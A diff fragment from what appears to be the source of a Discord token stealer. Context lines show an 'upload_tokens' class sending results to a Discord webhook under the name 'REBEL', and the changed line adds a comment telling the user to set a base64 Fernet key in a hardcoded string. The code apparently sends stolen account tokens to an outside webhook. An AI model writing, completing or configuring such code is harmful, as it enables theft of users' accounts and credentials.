@@ -371,4 +371,4 @@ class upload_tokens:
 
             self.webhook.send(embed=embed, username="REBEL", avatar_url="https://media.discordapp.net/attachments/1070581776537374721/1080930552967860315/static.png")
 class c:
-    y="dTFLb2ZnT2ZCX2RxdmlqR0tlT1R1MWM3QnJ1anBSQ1JFeVhUbkVjRmctUT0="
+    y="dTFLb2ZnT2ZCX2RxdmlqR0tlT1R1MWM3QnJ1anBSQ1JFeVhUbkVjRmctUT0=" # Generate Fernet Key and encrypt Result in Base64 and place in String.
